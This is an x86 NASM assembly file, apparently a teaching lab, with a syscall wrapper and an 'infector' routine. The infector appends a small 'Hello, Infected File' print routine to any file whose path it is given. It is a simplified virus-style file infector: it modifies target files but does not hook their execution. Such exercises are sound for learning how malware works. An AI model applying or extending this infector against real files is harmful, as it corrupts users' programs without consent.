section .data
    msg: db "Hello, Infected File", 10, 0
    len: equ $ -msg
section .text
global _start
global system_call
global infector
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc
    

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infiction:
        push ebp              		; save Base Pointer (bp) original value
        mov ebp, esp
        pushad
        mov eax , 4
        mov ebx ,1
        mov ecx ,msg
        mov edx ,len
        int 0x80
        popad
        mov eax,0         		; return value 0 no error oucrired 
        mov esp, ebp			; free function activation frame
        pop ebp	
        ret
code_end:

infector:
    push ebp              		; save Base Pointer (bp) original value
    mov ebp, esp
    pushad
    mov ebx, dword [ebp+8] ;pathname in ebx
    mov eax,5  ;open
    mov ecx,1025  ;append and write 
    mov edx, 0777
    int 0x80  ;open the file
    mov ebx,eax ; the file descriptor to ebx
    mov eax , 4 ; write
    mov ecx , code_start
    mov edx, code_end
    sub edx ,code_start
    push ebx
    int 0x80
    pop ebx
    mov eax, 6 ;close
    int 0x80
    popad                    	; restore all previously used registers
    mov eax,0         		; return value 0 no error oucrired 
    mov esp, ebp			; free function activation frame
    pop ebp				; restore Base Pointer previous value (to returnt to the activation frame of main(...))
    ret





    